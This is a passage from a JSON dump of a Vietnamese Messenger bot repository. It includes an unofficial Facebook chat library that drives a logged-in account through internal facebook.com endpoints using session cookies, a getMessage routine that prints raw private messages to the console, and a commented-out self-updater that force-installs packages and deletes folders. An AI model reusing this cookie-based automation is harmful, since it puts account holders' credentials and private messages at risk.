m·∫£ng\n    const MAXIMUM_ERROR_TIME = 10 * 1000;\n    return { //khi check = false th√¨ c·∫ßn c·∫≠p nh·∫≠t v√¨ ƒë√£ h∆°n th·ªùi gian tb + 15p\n        Check:  (parseInt(avgTimeStamp) + parseInt(DEFAULT_UPDATE_TIME)) + parseInt(MAXIMUM_ERROR_TIME) >= Date.now(), // ·ªü ƒë√¢y avgTimeStamp l√† th·ªùi gian c·ªë ƒë·ªãnh c·ªßa 1 m·∫£ng queue khi ƒë·∫ßy \n        timeLeft: (parseInt(avgTimeStamp) + parseInt(DEFAULT_UPDATE_TIME)) - Date.now() + parseInt(MAXIMUM_ERROR_TIME)\n    }\n  }\n  \n  const autoCheckAndUpdateRecallTime = () => {\n      let holdTime = [];\n      let oneTimeCall = false;\n      //l·∫•y t·∫•t c·∫£ trung b√¨nh th·ªùi gian c·ªßa t·∫•t c·∫£ m·∫£ng v√† t√¨m th·ªùi gian c√≤n l·∫°i ng·∫Øn nh·∫•t, n·∫øu c√≥ s·∫µn id c·∫ßn c·∫≠p nh·∫≠t th√¨ c·∫≠p nh·∫≠t ng√†y l·∫≠p t·ª©c\n      Queues.forEach((i, index) => {\n          // [ { threadID, TimeCreate }, {} ]\n          const averageTimestamp = Math.round(i.reduce((acc, obj) => acc + obj.TimeCreate, 0) / i.length);\n          const DataAvg = checkAverageStaticTimestamp(averageTimestamp);\n          if (DataAvg.Check) {\n            //c·∫ßn ch·ªù\n             // holdTime.push(DataAvg.timeLeft);\n             //cho thi cho 10s sau check lai roi cho tiep nhe =))\n          }\n          else {\n            oneTimeCall = true;\n          }\n      });\n\n      if (oneTimeCall) autoUpdateData(); // c·∫≠p nh·∫≠t ngay, nhin la biet tot hon hold roi =))\n\n      // if (holdTime.length >= 1) {\n      //     holdTime.sort((a,b) => a - b) //low to high time\n      //     if (holdTime[0] > Request_Update_Time) {\n      //         Request_Update_Time = holdTime[0];\n      //         clearInterval(updateInterval);\n      //         updateInterval = setInterval(() => { autoUpdateData(); }, holdTime[0])\n      //     }\n      // }\n\n      //hold lam cai cho gi khi ta co check lien tuc 10s 1 lan üòî\n\n      const MAXIMUM_RECALL_TIME = 30 * 1000;\n      clearTimeout(updateTimeout);\n      updateTimeout = setTimeout(() => { autoCheckAndUpdateRecallTime(); }, MAXIMUM_RECALL_TIME)\n  }\n  \n  const autoUpdateData = async function() {\n      //[ [ {}, {} ], [ {}, {}  ] ]\n      let doUpdate = [];\n      let holdTime = [];\n  \n      Queues.forEach((i, index) => {\n          // [ {}, {} ]\n          const averageTimestamp = Math.round(i.reduce((acc, obj) => acc + obj.TimeCreate, 0) / i.length);\n          // th·ªùi gian trung b√¨nh c·ªßa 1 m·∫£ng t·ª´ l√∫c b·∫Øt ƒë·∫ßu request l·∫ßn ƒë·∫ßu, c·∫ßn + th√™m th·ªùi gian c·ªë ƒë·ªãnh l√† 15p !\n  \n          const DataAvg = checkAverageStaticTimestamp(averageTimestamp)\n          if (DataAvg.Check) {\n              // ch·ªù ti·∫øp\n          }\n          else {\n            // ƒë√£ h∆°n th·ªùi gian 15p\n              doUpdate.push(i) // [ {}, {} ]\n              Queues.splice(index, 1); //ƒë·∫°t ƒëi·ªÅu ki·ªán n√™n xo√° ƒë·ªÉ t√Ω n√≥ t·ª± th√™m üíÄ\n          }\n  \n      });\n  \n      if (doUpdate.length >= 1) {\n          // maybe [ [ {}, {} ] [ {}, {} ] ]\n          let ids = []; // [ id, id ]\n          doUpdate.forEach(i => {\n              //[ {} {} ]\n              const onlyThreadID = [...new Set(i.map(obj => obj.threadID))]; // [ id1, id2 ]\n              ids.push(onlyThreadID) //[ [ id1, id2 ] ]\n          })\n  \n          // [ [ id1, id2 ],[ id1, id2 ] ] 5 per arr\n  \n          ids.forEach(async function(i) {\n              const dataResp = await getMultiInfo(i);\n              if (dataResp.Success == true) {\n                  let MultiThread = dataResp.Data;\n                  formatAndUpdateData(MultiThread)\n              }\n              else {\n                  global.Fca.Require.logger.Warning('CANT NOT GET THREADINFO üíÄ MAYBE U HAS BEEN BLOCKED FROM FACEBOOK');\n              }\n          })\n      }\n  }\n  \n  const createOrTakeDataFromDatabase = async (threadIDs) => {\n      let inDb = []; //NOTE: x·ª≠ l√Ω resp th√†nh 1 m·∫£ng n·∫øu c√≥ nhi·ªÅu h∆°n 1 threadID v√† obj n·∫øu 1 threadID\n      let inFastArr = [];\n      let createNow = [];\n      let cbThreadInfos = [];\n      // ki·ªÉm tra v√† ph√¢n ra 2 lo·∫°i 1 l√† ch∆∞a  c√≥ 2 l√† c√≥ =))\n      // ki·ªÉm tra\n  \n      threadIDs.forEach(id => {\n          // id, id ,id\n          hasData(id) == true ? inDb.push(id) : createNow.push(id)\n      });\n\n      if (inDb.length >= 1) {\n          let threadInfos = inDb.map(id => getData(id));\n          cbThreadInfos = cbThreadInfos.concat(threadInfos);\n          updateUserInfo(threadInfos);\n  \n          //request update queue\n          threadInfos.forEach(i => addToQueues({ threadID: i.threadID, TimeCreate: Date.now() }));\n      }\n      if (createNow.length >= 1) {\n          //5 data per chunk []\n          const chunkSize = 5;\n          const totalChunk = []; // [ [ id, id ], [ id,id ] ]\n          \n          for (let i = 0; i < createNow.length; i += chunkSize) {\n            const chunk = createNow.slice(i, i + chunkSize);\n            totalChunk.push(chunk);\n          }\n  \n          for (let i of totalChunk) {\n              //i = [ id,id ]\n              const newThreadInf = await getMultiInfo(i); // always [ {} ] or [ {}, {} ]\n              if (newThreadInf.Success == true) {\n                let MultiThread = newThreadInf.Data;  \n                formatAndCreateData(MultiThread)\n                cbThreadInfos = cbThreadInfos.concat(MultiThread)\n    \n                //request update queue\n                MultiThread.forEach(i => addToQueues({ threadID: i.threadID, TimeCreate: Date.now() }));\n            }\n            else {\n                global.Fca.Require.logger.Warning('CANT NOT GET THREADINFO üíÄ MAYBE U HAS BEEN BLOCKED FROM FACEBOOK');\n            }\n          } \n      }\n      return cbThreadInfos.length == 1 ? callback(null, cbThreadInfos[0]) : callback(null, cbThreadInfos)\n  }\n\n    if (global.Fca.Data.Already != true) {\n      global.Fca.Data.Already = true;\n      autoCheckAndUpdateRecallTime(); \n      setInterval(function(){ \n        const MapToArray = Array.from(global.Fca.Data.Userinfo, ([name, value]) => (value));\n        Database(true).set('UserInfo', MapToArray); \n      }, 420 * 1000); \n    } \n\n    await createOrTakeDataFromDatabase(threadID);\n    \n    return returnPromise;\n  };\n};","path":null,"size_bytes":15928,"size_tokens":null},"modules/events/joinnoti.js":{"content":"module.exports.config = {\n    name: \"joinNoti\",\n    eventType: [\"log:subscribe\"],\n    version: \"1.0.1\",\n    credits: \"TatsuYTB\",\n    description: \"Th√¥ng b√°o bot ho·∫∑c ng∆∞·ªùi v√†o nh√≥m\"\n};\n\nmodule.exports.run = async function({ api, event, Users }) {\n    const { threadID, logMessageData } = event;\n    const pathData = require(\"path\").join(__dirname, \"../commands/data/joinNoti.json\");\n    const { readFileSync } = require(\"fs-extra\");\n\n    const botID = api.getCurrentUserID();\n    const botAdded = logMessageData.addedParticipants.some(p => p.userFbId == botID);\n\n    if (botAdded) {\n        await api.changeNickname(\n            `[ ${global.config.PREFIX} ] ‚Ä¢ ${global.config.BOTNAME || \"Bot\"}`,\n            threadID,\n            botID\n        );\n        return api.sendMessage(`[ùêäùêûÃÇÃÅùê≠ ùêçùê®ÃÇÃÅùê¢ ùêìùê°ùêöÃÄùêßùê° ùêÇùê®ÃÇùêßùê†]`, threadID);\n    }\n\n    let dataJson = [];\n    try { dataJson = JSON.parse(readFileSync(pathData, \"utf-8\")); } \n    catch { dataJson = []; }\n\n    const thisThread = dataJson.find(i => i.threadID == threadID) || { message: null, enable: true };\n    if (!thisThread.enable) return; \n\n    let msg = thisThread.message || `‚úø‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚úø\nùêóùê¢ùêß ùêúùê°ùêöÃÄùê®: [ {name} ]\nùêÇùê°ùêöÃÄùê® ùê¶ùêÆÃõÃÄùêßùê† ùêõùêöÃ£ùêß ƒëùêûÃÇÃÅn ùêØùê®ÃõÃÅùê¢: [ {threadName} ]\nùêÅùêöÃ£ùêß ùê•ùêöÃÄ ùê≠ùê°ùêöÃÄùêßùê° ùêØùê¢ùêûÃÇùêß ùê¨ùê®ÃÇÃÅ: [ {soThanhVien} ]\nùêÉÃÑùêÆÃõùê®ÃõÃ£ùêú ùê≠ùê°ùêûÃÇùê¶ ùêõùê®ÃõÃâùê¢: [ {author} ]\nùêÇùê°ùêÆÃÅùêú ùêõùêöÃ£ùêß ùêúùê®ÃÅ ùê¶ùê®ÃÇÃ£ùê≠ ùêßùê†ùêöÃÄùê≤ ùêØùêÆùê¢ ùêØùêûÃâ üíù\n‚úø‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚úø`;\n\n    const nameArray = [];\n    const mentions = [];\n\n    for (const p of logMessageData.addedParticipants) {\n        if (p.userFbId == botID) continue; \n        const userName = p.fullName;\n        nameArray.push(userName);\n        mentions.push({ tag: userName, id: p.userFbId });\n\n        if (!global.data.allUserID.includes(p.userFbId)) {\n            await Users.createData(p.userFbId, { name: userName, data: {} });\n            global.data.userName.set(p.userFbId, userName);\n            global.data.allUserID.push(p.userFbId);\n        }\n    }\n\n    if (nameArray.length == 0) return; \n\n    const threadInfo = await api.getThreadInfo(threadID);\n    const authorData = await Users.getData(event.author);\n    const authorName = authorData?.name || \"link join\";\n\n    const moment = require(\"moment-timezone\");\n    const time = moment.tz(\"Asia/Ho_Chi_Minh\");\n    const gio = parseInt(time.format(\"HH\"));\n    const bok = time.format(\"DD/MM/YYYY\");\n\n    let buoi = \"ùêÅùêÆùê®ÃÇÃâùê¢ ùêíùêöÃÅùêßùê†\";\n    if (gio >= 11) buoi = \"ùêÅùêÆùê®ÃÇÃâùê¢ ùêìùê´ùêÆÃõùêö\";\n    if (gio >= 14) buoi = \"ùêÅùêÆùê®ÃÇÃâùê¢ ùêÇùê°ùê¢·ªÄùêÆ\";\n    if (gio >= 19) buoi = \"ùêÅùêÆùê®ÃÇÃâùê¢ ùêìùê®ÃÇÃÅùê¢\";\n\n    msg = msg\n        .replace(/\\{name}/g, nameArray.join(\", \"))\n        .replace(/\\{type}/g, nameArray.length > 1 ? \"ùêúùêöÃÅùêú ùêõùêöÃ£ùêß\" : \"ùêõùêöÃ£ùêß\")\n        .replace(/\\{soThanhVien}/g, threadInfo.participantIDs.length)\n        .replace(/\\{threadName}/g, threadInfo.threadName)\n        .replace(/\\{author}/g, authorName)\n        .replace(/\\{get}/g, buoi)\n        .replace(/\\{bok}/g, bok);\n\n    return api.sendMessage({ body: msg, mentions }, threadID);\n};\n","path":null,"size_bytes":3405,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/forwardAttachment.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function forwardAttachment(attachmentID, userOrUsers, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n\n    var form = {\n      attachment_id: attachmentID\n    };\n\n    if (utils.getType(userOrUsers) !== \"Array\") userOrUsers = [userOrUsers];\n\n    var timestamp = Math.floor(Date.now() / 1000);\n\n    //That's good, the key of the array is really timestmap in seconds + index\n    //Probably time when the attachment will be sent?\n    for (var i = 0; i < userOrUsers.length; i++) form[\"recipient_map[\" + (timestamp + i) + \"]\"] = userOrUsers[i];\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/mercury/attachments/forward/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx.jar, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"forwardAttachment\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1408,"size_tokens":null},"lib/fca-auto/src/handleMessageRequest.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (/** @type {{ post: any; postFormData?: (arg0: string, arg1: any, arg2: any, arg3: {}) => any; get?: (arg0: any, arg1: any) => Promise<any>; }} */ defaultFuncs, /** @type {any} */ api, /** @type {{ jar: any; fb_dtsg?: string; ttstamp?: string; }} */ ctx) {\n  return function handleMessageRequest(/** @type {string | any[]} */ threadID, /** @type {any} */ accept, /** @type {((err: any, data: any) => void) | ((arg0: undefined) => any)} */ callback) {\n    if (utils.getType(accept) !== \"Boolean\") throw { error: \"Please pass a boolean as a second argument.\" };\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (/** @type {any} */ err, /** @type {any} */ data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      client: \"mercury\"\n    };\n\n    if (utils.getType(threadID) !== \"Array\") threadID = [threadID];\n\n    var messageBox = accept ? \"inbox\" : \"other\";\n\n    for (var i = 0; i < threadID.length; i++) form[messageBox + \"[\" + i + \"]\"] = threadID[i];\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/move_thread.php\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (/** @type {{ error: any; }} */ resData) {\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (/** @type {string} */ err) {\n        log.error(\"handleMessageRequest\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1794,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getMessage.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n    return function getMessage(threadID, messageID, callback) {\n      if (!callback) {\n        //return callback({ error: \"getMessage: need callback\" });\n      }\n\n      if (!threadID || !messageID) {\n        return callback({ error: \"getMessage: need threadID and messageID\" });\n      }\n\n      const form = {\n        \"av\": ctx.userID,\n        \"queries\": JSON.stringify({\n          \"o0\": {\n            //This doc_id is valid as of ? (prob January 18, 2020)\n            \"doc_id\": \"1768656253222505\",\n            \"query_params\": {\n              \"thread_and_message_id\": {\n                \"thread_id\": threadID,\n                \"message_id\": messageID,\n              }\n            }\n          }\n        })\n      };\n\n      defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then((resData) => {\n        if (resData[resData.length - 1].error_results > 0) {\n          throw resData[0].o0.errors;\n        }\n\n        if (resData[resData.length - 1].successful_results === 0) {\n          throw { error: \"getMessage: there was no successful_results\", res: resData };\n        }\n\n        var fetchData = resData[0].o0.data.message;\n        console.log(resData)\n        if (fetchData) {\n          (!ctx.globalOptions.selfListen &&\n            fetchData.message_sender.id.toString() === ctx.userID) ||\n            !ctx.loggedIn ?\n            undefined :\n            (function () {\n              console.log( {\n                threadID: threadID,\n                messageID: fetchData.message_id,\n                senderID: fetchData.message_sender.id,\n                attachments: fetchData.blob_attachments.map(att => {\n                    var x;\n                    try {\n                        x = utils._formatAttachment(att);\n                    } catch (ex) {\n                        x = att;\n                        x.error = ex;\n                        x.type = \"unknown\";\n                    }\n                    return x;\n                }),\n                body: fetchData.message.text,\n                mentions: fetchData.message.ranges,\n                timestamp: fetchData.timestamp_precise,\n                messageReply: fetchData.replied_to_message,\n                raw: fetchData,\n            })\n              callback(null, {\n                threadID: threadID,\n                messageID: fetchData.message_id,\n                senderID: fetchData.message_sender.id,\n                attachments: fetchData.blob_attachments.map(att => {\n                    var x;\n                    try {\n                        x = utils._formatAttachment(att);\n                    } catch (ex) {\n                        x = att;\n                        x.error = ex;\n                        x.type = \"unknown\";\n                    }\n                    return x;\n                }),\n                body: fetchData.message.text,\n                mentions: fetchData.message.ranges,\n                timestamp: fetchData.timestamp_precise,\n                messageReply: fetchData.replied_to_message,\n                raw: fetchData,\n            }); })();\n        }\n    })\n    .catch((err) => {\n      log.error(\"getMessage\", err);\n      callback(err);\n    });\n\n  };\n}; ","path":null,"size_bytes":3417,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/setTitle.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function setTitle(newTitle, threadID, callback) {\n    if (\n      !callback &&\n      (utils.getType(threadID) === \"Function\" ||\n        utils.getType(threadID) === \"AsyncFunction\")\n    ) throw { error: \"please pass a threadID as a second argument.\" };\n\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    var messageAndOTID = utils.generateOfflineThreadingID();\n    var form = {\n      client: \"mercury\",\n      action_type: \"ma-type:log-message\",\n      author: \"fbid:\" + ctx.userID,\n      author_email: \"\",\n      coordinates: \"\",\n      timestamp: Date.now(),\n      timestamp_absolute: \"Today\",\n      timestamp_relative: utils.generateTimestampRelative(),\n      timestamp_time_passed: \"0\",\n      is_unread: false,\n      is_cleared: false,\n      is_forward: false,\n      is_filtered_content: false,\n      is_spoof_warning: false,\n      source: \"source:chat:web\",\n      \"source_tags[0]\": \"source:chat\",\n      status: \"0\",\n      offline_threading_id: messageAndOTID,\n      message_id: messageAndOTID,\n      threading_id: utils.generateThreadingID(ctx.clientID),\n      manual_retry_cnt: \"0\",\n      thread_fbid: threadID,\n      thread_name: newTitle,\n      thread_id: threadID,\n      log_message_type: \"log:thread-name\"\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/messaging/set_thread_name/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error && resData.error === 1545012) throw { error: \"Cannot change chat title: Not member of chat.\" };\n        if (resData.error && resData.error === 1545003) throw { error: \"Cannot set title of single-user chat.\" };\n        if (resData.error) throw resData;\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"setTitle\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":2309,"size_tokens":null},"lib/fca-auto/Extra/Src/Check_Update.js":{"content":"// module.exports = async function(Stable_Version) {\n//     const got = require('got');\n//     const log = require('npmlog');\n//     const fs = require('fs');\n//     const Database = require('../Database');\n//     const { execSync } = require('child_process');\n//     //make request https://raw.githubusercontent.com/KanzuXHorizon/Fca-Horizon-Remastered/main/package.json\n//     const { body } = await got('https://raw.githubusercontent.com/KanzuXHorizon/Fca-Horizon-Remastered/main/package.json');\n//     const json = JSON.parse(body);\n//     const LocalVersion = require('../../package.json').version;\n//         if (Number(LocalVersion.replace(/\\./g,\"\")) < Number(json.version.replace(/\\./g,\"\")) && global.Fca.Require.FastConfig.Stable_Version.Accept == false || Stable_Version && Number(LocalVersion.replace(/\\./g,\"\")) != Number(Stable_Version.replace(/\\./g,\"\"))) {\n//             var Version = Stable_Version != undefined ? Stable_Version : json.version;\n//             log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"New Version, Ready to Update: \" + LocalVersion + \" -> \" + Version);    \n//             await new Promise(resolve => setTimeout(resolve, 3000));\n//             try {\n//                 execSync(`npm install fca-horizon-remastered@${Version}`, { stdio: 'inherit' });\n//                 log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Complete, Restarting...\");\n//                 await new Promise(resolve => setTimeout(resolve, 3000));\n//                 Database().set(\"Instant_Update\", Date.now());\n//                 await new Promise(resolve => setTimeout(resolve, 3000));\n//                 process.exit(1);\n//             }\n//             catch (err) {\n//                 try {\n//                     console.log(err);  \n//                     log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Failed, Trying Another Method 1...\");\n//                     await new Promise(resolve => setTimeout(resolve, 3000));\n//                     execSync(`npm install fca-horizon-remastered@${Version} --force`, { stdio: 'inherit' });\n//                     log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Complete, Restarting...\");\n//                     await new Promise(resolve => setTimeout(resolve, 3000));\n//                     Database().set(\"Instant_Update\", Date.now());\n//                     await new Promise(resolve => setTimeout(resolve, 3000));\n//                     process.exit(1);\n//                 }\n//                 catch (err) {\n//                     try {\n//                         console.log(err);\n//                         log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Failed, Trying to clean Database() cache...\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         execSync('npm cache clean --force', { stdio: 'inherit' });\n//                         log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Cache Cleaned, Trying Another Method 2...\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         //self delete fca-horizon-remastered folder from node_modules\n//                         fs.rmdirSync((process.cwd() + \"/node_modules/fca-horizon-remastered\" || __dirname + '../../../fca-horizon-remastered'), { recursive: true });\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         execSync(`npm install fca-horizon-remastered@${Version}`, { stdio: 'inherit' });\n//                         log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Complete, Restarting...\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         Database().set(\"Instant_Update\", Date.now(), true);\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         process.exit(1);\n//                     }\n//                     catch (e) {\n//                         console.log(e);\n//                         log.error(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Failed, Please Update Manually\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Please contact to owner about update failed and screentshot error log at fb.com/Lazic.Kanzu\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         process.exit(1);\n//                     }\n//                 }\n//             }\n//         }\n//     else {\n//         return Database().set(\"NeedRebuild\", false, true);\n//     }\n// }","path":null,"size_bytes":4533,"size_tokens":null},"lib/fca-auto/Extra/Src/History.js":{"content":"/**\n * Console History v1.5.1\n * console-history.js\n *\n * Licensed under the MIT License.\n * https://git.io/console\n */\n'use strict'\n\n/* Allow only one instance of console-history.js */\nif (typeof console.history !== 'undefined') {\n    throw new Error('Only one instance of console-history.js can run at a time.')\n}\n\n/* Store the original log functions. */\nconsole._log = console.log\nconsole._info = console.info\nconsole._warn = console.warn\nconsole._error = console.error\nconsole._debug = console.debug\n\n/* Declare our console history variable. */\nconsole.history = []\n\n/* Redirect all calls to the collector. */\nconsole.log = function(dt) {\n    return console._intercept('log', dt, arguments)\n}\nconsole.info = function(dt) {\n    return console._intercept('info', dt, arguments)\n}\nconsole.warn = function(dt) {\n    return console._intercept('warn', dt, arguments)\n}\nconsole.error = function(dt) {\n    return console._intercept('error', dt, arguments)\n}\nconsole.debug = function(dt) {\n    return console._intercept('debug', dt, arguments)\n}\n\n/* Give the developer the ability to intercept the message before letting\n   console-history access it. */\nconsole._intercept = function(type, data, args) {\n    // Your own code can go here, but the preferred method is to override this\n    // function in your own script, and add the line below to the end or\n    // begin of your own 'console._intercept' function.\n    // REMEMBER: Use only underscore console commands inside _intercept!\n    console._collect(type, data,args)\n}\n\n/* Define the main log catcher. */\nconsole._collect = function(type, data, args) {\n    // WARNING: When debugging this function, DO NOT call a modified console.log\n    // function, all hell will break loose.\n    // Instead use the original console._log functions.\n\n    // All the arguments passed to any function, even when not defined\n    // inside the function declaration, are stored and locally available in\n    // the variable called 'arguments'.\n    //\n    // The arguments of the original console.log functions are collected above,\n    // and passed to this function as a variable 'args', since 'arguments' is\n    // reserved for the current function.\n\n    // Collect the timestamp of the console log.\n    const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric' };\n\n    var time = new Date().toLocaleDateString('vi-VN', options)\n\n    // Make sure the 'type' parameter is set. If no type is set, we fall\n    // back to the default log type.\n    if (!type) type = 'log'\n\n    // To ensure we behave like the original console log functions, we do not\n    // output anything if no arguments are provided.\n    if (!args || args.length === 0) return\n\n    // Act normal, and just pass all original arguments to\n    // the origial console function :)\n    console['_' + type].apply(console, args)\n\n    // Get stack trace information. By throwing an error, we get access to\n    // a stack trace. We then go up in the trace tree and filter out\n    // irrelevant information.\n    var stack = false\n    try {\n        throw Error('')\n    } catch (error) {\n        // The lines containing 'console-history.js' are not relevant to us.\n        var stackParts = error.stack.split('\\n')\n        stack = []\n        for (var i = 0; i < stackParts.length; i++) {\n            if (stackParts[i].indexOf('console-history.js') > -1 ||\n                stackParts[i].indexOf('console-history.min.js') > -1 ||\n                stackParts[i] === 'Error') {\n                continue\n            }\n            stack.push(stackParts[i].trim())\n        }\n    }\n    try {\n        data = data.replace(/[\\u001b\\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g,'')\n    }\n    catch (e) {\n        data = data;\n    }\n    // Add the log to our history.\n    console.history.push({\n        type: type,\n        timestamp: time,\n        message: data,\n        stack: stack\n    })\n}","path":null,"size_bytes":3962,"size_tokens":null},"lib/fca-auto/src/deleteMessage.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function deleteMessage(messageOrMessages, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n\n        resolveFunc();\n      };\n    }\n\n    var form = {\n      client: \"mercury\"\n    };\n\n    if (utils.getType(messageOrMessages) !== \"Array\") messageOrMessages = [messageOrMessages];\n\n    for (var i = 0; i < messageOrMessages.length; i++) form[\"message_ids[\" + i + \"]\"] = messageOrMessages[i];\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/delete_messages.php\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"deleteMessage\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1212,"size_tokens":null},"modules/commands/tc.js":{"content":"const fs = require('fs');\nconst path = require('path');\nconst moment = require('moment-timezone');\nconst dataDir = path.join(__dirname, 'tc');\nconst dataPath = path.join(dataDir, 'tc.json');\nconst commandsDir = path.join(__dirname, '..', 'commands');\n\n// Ki·ªÉm tra v√† t·∫°o th∆∞ m·ª•c, t·ªáp n·∫øu kh√¥ng t·ªìn t·∫°i\nif (!fs.existsSync(dataDir)) {\n    fs.mkdirSync(dataDir);\n}\nif (!fs.existsSync(dataPath)) {\n    const initialData = {\n        daily: {},\n        weekly: {},\n        total: {},\n        lastUpdateDay: moment().format('YYYY-MM-DD'),\n        lastUpdateWeek: moment().startOf('isoWeek').format('YYYY-MM-DD'),\n    };\n    fs.writeFileSync(dataPath, JSON.stringify(initialData, null, 4));\n}\n\nmodule.exports.config = {\n    name: \"tc\",\n    version: \"1.1.0\",\n    hasPermssion: 3,\n    credits: \"TatsuYTB\",\n    description: \"Th·ªëng k√™ d√πng l·ªánh tr√™n H·ªá Th·ªëng bot\",\n    commandCategory: \"H·ªá Th·ªëng\",\n    usages: \"[day|week|all|reset]\",\n    cooldowns: 5,\n    dependencies: {},\n};\n\nmodule.exports.onLoad = () => {\n    const data = JSON.parse(fs.readFileSync(dataPath, 'utf-8'));\n\n    fs.readdir(commandsDir, (err, files) => {\n        if (err) throw err;\n        files.forEach(file => {\n            if (file.endsWith('.js')) {\n                const commandName = path.basename(file, '.js');\n\n                if (!data.daily[commandName]) data.daily[commandName] = 0;\n                if (!data.weekly[commandName]) data.weekly[commandName] = 0;\n                if (!data.total[commandName]) data.total[commandName] = 0;\n            }\n        });\n\n        fs.writeFileSync(dataPath, JSON.stringify(data, null, 4));\n    });\n\n    setInterval(() => {\n        const today = moment().format('YYYY-MM-DD');\n        const weekStart = moment().startOf('isoWeek').format('YYYY-MM-DD');\n\n        if (data.lastUpdateDay !== today) {\n            data.daily = {};\n            data.lastUpdateDay = today;\n        }\n\n        if (data.lastUpdateWeek !== weekStart) {\n            data.weekly = {};\n            data.lastUpdateWeek = weekStart;\n        }\n\n        fs.writeFileSync(dataPath, JSON.stringify(data, null, 4));\n    }, 60 * 60 * 1000);\n};\n\nmodule.exports.handleEvent = async function ({ event, api, Threads }) {\n    const { threadID, body } = event;\n    if (!body) return;\n\n    const threadSetting = (await Threads.getData(threadID)).data;\n    const prefix = threadSetting.PREFIX || global.config.PREFIX;\n\n    if (!body.startsWith(prefix)) return;\n\n    const commandName = body.slice(prefix.length).trim().split(' ')[0];\n\n    const commandFile = path.join(commandsDir, `${commandName}.js`);\n    if (!fs.existsSync(commandFile)) return;\n\n    const data = JSON.parse(fs.readFileSync(dataPath, 'utf-8'));\n    const today = moment().format('YYYY-MM-DD');\n    const weekStart = moment().startOf('isoWeek').format('YYYY-MM-DD');\n\n    if (!data.daily[commandName]) 